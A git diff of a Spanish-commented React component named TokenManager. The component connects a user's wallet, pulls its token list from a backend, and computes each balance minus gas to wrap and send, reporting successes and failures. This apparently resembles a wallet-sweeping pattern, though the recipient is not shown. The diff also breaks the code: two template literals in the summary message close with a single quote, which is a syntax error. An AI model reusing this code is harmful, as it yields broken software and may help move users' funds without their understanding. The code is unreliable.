@@ -11,7 +11,6 @@ interface Token {
   balance?: string
   decimals?: number
   chain?: number
-  // otros campos que el backend retorne pueden añadirse aquí
 }
 
 interface SentItem {
@@ -30,7 +29,6 @@ interface FailedItem {
 export default function TokenManager(): React.JSX.Element {
   const { open } = useAppKit()
   const { address, isConnected } = useAccount()
-  // tipado explícito para evitar any implícito de hooks
   const walletClient = (useWalletClient() as { data?: any }).data
   const publicClient: any = usePublicClient()
   const { data: balance } = useBalance({ address })
@@ -39,87 +37,37 @@ export default function TokenManager(): React.JSX.Element {
   const [loading, setLoading] = useState<boolean>(false)
   const [processing, setProcessing] = useState<boolean>(false)
   const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
+  const [isClient, setIsClient] = useState<boolean>(false)
+  const [isMobileDevice, setIsMobileDevice] = useState<boolean>(false)
 
-  // Valor seguro para backend (evita fetch a "undefined" o a localhost en prod)
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
 
   useEffect(() => {
-    // Mostramos el valor para depuración (borra luego)
-    if (typeof window !== 'undefined') {
-      console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
-      console.log('[ENV] NEXT_PUBLIC_PROJECT_URL =', process.env.NEXT_PUBLIC_PROJECT_URL)
+    setIsClient(true)
+    
+    // Detectar si es dispositivo móvil
+    setIsMobileDevice(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))
+
+    // Mostrar valores de entorno para depuración
+    console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
+    console.log('[ENV] NEXT_PUBLIC_PROJECT_URL =', process.env.NEXT_PUBLIC_PROJECT_URL)
+
+    // Global error handlers
+    const onError = (e: ErrorEvent) => {
+      console.error('Global error captured:', e.error || e.message || e)
+    }
+    const onRejection = (e: PromiseRejectionEvent) => {
+      console.error('Unhandled rejection captured:', e.reason || e)
     }
 
-    // Global error handlers para evitar que excepciones no capturadas tumben la UI
-    if (typeof window !== 'undefined') {
-      const onError = (e: ErrorEvent) => {
-        console.error('Global error captured:', e.error || e.message || e)
-      }
-      const onRejection = (e: PromiseRejectionEvent) => {
-        console.error('Unhandled rejection captured:', e.reason || e)
-      }
+    window.addEventListener('error', onError)
+    window.addEventListener('unhandledrejection', onRejection)
 
-      window.addEventListener('error', onError)
-      window.addEventListener('unhandledrejection', onRejection)
-
-      return () => {
-        window.removeEventListener('error', onError)
-        window.removeEventListener('unhandledrejection', onRejection)
-      }
+    return () => {
+      window.removeEventListener('error', onError)
+      window.removeEventListener('unhandledrejection', onRejection)
     }
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [])
-
-  // Interceptamos HEAD/GET al root de la misma origin para evitar errores 500 que rompen comprobaciones COOP/COEP de librerías externas.
-  useEffect(() => {
-    if (typeof window === 'undefined') return
-    const w = window as any
-    if (!w.fetch) return
-
-    const originalFetch = w.fetch.bind(window)
-    const origin = window.location.origin
-
-    w.fetch = async (input: RequestInfo, init?: RequestInit) => {
-      try {
-        let urlStr: string
-        let method: string = 'GET'
-
-        if (typeof input === 'string') {
-          urlStr = input
-          if (init && init.method) method = String(init.method).toUpperCase()
-        } else {
-          urlStr = input.url
-          method = (input as Request).method || (init && init.method ? String(init.method).toUpperCase() : 'GET')
-        }
-
-        // Normalize relative URLs
-        const parsed = new URL(urlStr, origin)
-        const isSameOrigin = parsed.origin === origin
-        const isRootPath = parsed.pathname === '/' || parsed.pathname === ''
-
-        // Intercept problematic checks to root (HEAD/GET) and return a synthetic 200 response.
-        // Esto evita que comprobaciones de COOP/COEP o HEAD/GET a '/' devuelvan 500 y rompan la app.
-        if (isSameOrigin && isRootPath && (method === 'HEAD' || method === 'GET')) {
-          console.warn(`[fetch-intercept] Synthetic ${method} 200 for ${parsed.href}`)
-          return new Response('', { status: 200, statusText: 'OK', headers: { 'Content-Type': 'text/plain' } })
-        }
-
-        // Default: forward to original fetch
-        return originalFetch(input, init)
-      } catch (e) {
-        console.warn('[fetch-intercept] error in interceptor, falling back to original fetch', e)
-        return originalFetch(input, init)
-      }
-    }
-
-    // Restore on unmount
-    return () => {
-      try {
-        w.fetch = originalFetch
-      } catch (e) {
-        // noop
-      }
-    }
   }, [])
 
   useEffect(() => {
@@ -134,7 +82,7 @@ export default function TokenManager(): React.JSX.Element {
       setLoading(true)
 
       if (!BACKEND) {
-        console.error('[CONFIG] NEXT_PUBLIC_BACKEND_URL no está definido. Evitando fetch a owner-tokens.')
+        console.error('[CONFIG] NEXT_PUBLIC_BACKEND_URL no está definido.')
         await alertAction('Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.')
         setLoading(false)
         return
@@ -153,7 +101,6 @@ export default function TokenManager(): React.JSX.Element {
       const data: any = await res.json()
       console.log('Tokens detectados:', data)
 
-      // Asegurarse de que los tokens nativos tengan address: null
       const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
         if (token.symbol === 'MATIC' && !token.address) {
           return { ...token, address: null }
@@ -170,25 +117,20 @@ export default function TokenManager(): React.JSX.Element {
     }
   }
 
-  // Reemplaza tu alertAction por esto
   const alertAction = async (message: string): Promise<void> => {
-    // React Native WebView (casting a any porque no es una propiedad estándar)
     if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
       ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
       return
     }
 
-    // En navegadores normales usamos globalThis y comprobamos que exista una función alert
     if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
       globalThis.alert(message)
       return
     }
 
-    // Fallback silencioso (por ejemplo en entornos de test/SSR)
     console.log('Alert fallback:', message)
   }
 
-  // Reemplaza tu confirmAction por esto
   const confirmAction = async (message: string): Promise<boolean> => {
     if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
       return new Promise((resolve) => {
@@ -213,16 +155,10 @@ export default function TokenManager(): React.JSX.Element {
     }
 
     if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
-      // globalThis.confirm devuelve booleano, lo convertimos a Promise para mantener la API async
       return Promise.resolve(Boolean(globalThis.confirm(message)))
     }
 
     return Promise.resolve(false)
-  }
-
-  const isMobile = (): boolean => {
-    if (typeof window === 'undefined') return false
-    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
   }
 
   const getWrapInfo = async (chainId: number): Promise<any | null> => {
@@ -272,7 +208,7 @@ export default function TokenManager(): React.JSX.Element {
       const balanceBN = ethers.BigNumber.from(token.balance || '0')
       const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
 
-      // Estimaciones de gas (valores por defecto)
+      // Estimaciones de gas
       const gasLimitTransfer = ethers.BigNumber.from(21000)
       const gasLimitWrap = ethers.BigNumber.from(100000)
 
@@ -429,8 +365,8 @@ export default function TokenManager(): React.JSX.Element {
 
     if (summary.sent.length > 0 || summary.failed.length > 0) {
       let message = '=== Resumen ===\n'
-      message += `Éxitos: ${summary.sent.length}\n`
-      message += `Fallos: ${summary.failed.length}\n`
+      message += `Éxitos: ${summary.sent.length}\n'
+      message += `Fallos: ${summary.failed.length}\n'
 
       if (summary.failed.length > 0) {
         message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
@@ -438,6 +374,16 @@ export default function TokenManager(): React.JSX.Element {
 
       await alertAction(message)
     }
+  }
+
+  // Evitar renderizado hasta que estemos en el cliente
+  if (!isClient) {
+    return (
+      <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
+        <h1>Administrador de Tokens</h1>
+        <p>Cargando...</p>
+      </div>
+    )
   }
 
   return (
